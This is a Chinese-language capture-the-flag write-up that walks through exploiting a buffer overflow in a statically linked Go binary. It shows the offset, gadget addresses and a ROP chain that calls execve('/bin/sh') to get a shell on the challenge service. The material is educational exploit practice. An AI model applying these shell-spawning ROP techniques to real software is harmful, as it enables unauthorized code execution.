# infant-gotoheaven

> Challenge Link: [infant-gogogo](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#infant-gogogo)
>
> Category: pwn

Give me your magic text ~~~

`nc bamboofox.cs.nctu.edu.tw 58795`

[infant-gogogo.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/1f36921a750a6904cf3b6133cecf1554/infant-gogogo.zip)

## 觀察

這支程式可以讓使用者輸入一串字串，看起來跟前一題的 [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 很像

```
% ./infant-gotoheaven                     
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Buffer overflow

先試一下是否也有 Buffer overflow

```
% ./infant-gogogo              
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834]

goroutine 1 [running]:
runtime.throw(0x4b9168, 0x5)
        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307
main.main()
        /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834
```

最後一行有寫到死在`infant-gogogo.go:20`

用`objdump`看一下發現是死在`ret`，所以應該跟上題一樣，也是可以**蓋到 return address**

![](https://i.imgur.com/J0SdY2P.png)

## 解法

這題跟  [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 的主要差別在於 [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 有提供可以直接拿到 shell 的 `system call` ，這題則要自己建 ROP chain

### payload

先隨便輸入來造成 segmenataion fault，確定程式會產生 buffer overflow，且是死在 return addresss 錯誤

![img](https://i.imgur.com/3w10UGw.png)

計算一下 payload 是 **256**

### ROP chain

因為 Go 的 binanry 檔是 static link 的，基本上可以從裡面拿到各式各樣的 gadget

```
% file infant-gogogo 
infant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

#### execve

根據 [這篇](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) 整理的表格，要執行 `execve("/bin/sh")` 的條件是

| rax  | System call | rdi                  | rsi                      | rdx                      |
| ---- | ----------- | -------------------- | ------------------------ | ------------------------ |
| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |

執行 `/bin/sh` 的話，只需要把 `rdi` 指向寫有 `/bin/sh` 的**位址**，`rsi` 及 `rdx`  則設成 0 (NULL) 即可

#### ROP gadget

基本上在設值的時候，如果可以拿到 `pop {resister}; ret` 形式的 gadget 最好，因為可以直接把要丟入的值寫在 gadget 的下一位，例如：

```
ropchain = pop_rax, p64(59)
```

這樣在執行 `pop rax` 時，會將 stack 上的第一位 pop 到 rax 上，而此時的第一位就會是 `p64(59)`

除此之外，也要注意**最後面必須是 ret** ，否則沒辦法繼續執行後段的 ROP chain

尋找 ROP gadget 可以使用指令 `ROPgadget` 搭配 `grep`，例如說要找 `pop rax` 時：

```
% ROPgadget --binary infant-gogogo | grep 'pop rax.*ret'
0x000000000044dd12 : add eax, ebp ; pop rax ; ret
0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000466d3e : je 0x466d67 ; pop rax ; ret
0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret
0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret
0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret
0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret
0x000000000040985c : pop rax ; or dh, dh ; ret
0x0000000000404656 : pop rax ; ret
0x0000000000414f4a : pop rax ; ret 0xff2
0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret
```

其中可以看到 `0x0000000000404656 : pop rax ; ret` 是最符合的 gadget

#### /bin/sh

前面有說到，`rdi`是寫有 `/bin/sh` 的**位址**，所以需要找一塊空間來寫 `/bin/sh`

在 gdb 中使用 `vmmap` 來尋找可用空間

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x0048a000         r-xp      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0048a000         0x0051c000         r--p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0051c000         0x0052f000         rw-p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0052f000         0x00550000         rw-p      [heap]
0x000000c000000000 0x000000c000001000 rw-p      mapped
0x000000c41fff8000 0x000000c420100000 rw-p      mapped
0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p      mapped
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

其中有段 `0x0051c000         0x0052f000         rw-p` 是可寫的，我選擇 `0x523000` 來寫，盡量不要選擇太前面或太後面的位置，怕跟其他東西衝到

可以寫入到 `rdi` 的有以下兩句

```
0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004518ff : mov qword ptr [rdi], rax ; ret
```

其中，`pop rdi` 的 gadget 後面還有 `add byte ptr [rax + 0x39]`，所以必須確保 `rax+0x39 `是一段可以寫的位址，否則會死掉

因此我先將 `rax` 設成 data 的位址，設完 `rdi` 後，再將 `rax` 設成 `/bin/sh` ，最後填入 `ptr [rdi]` 中即可



所有得條件都設定完成後，執行即可拿到 shell 囉 OwO

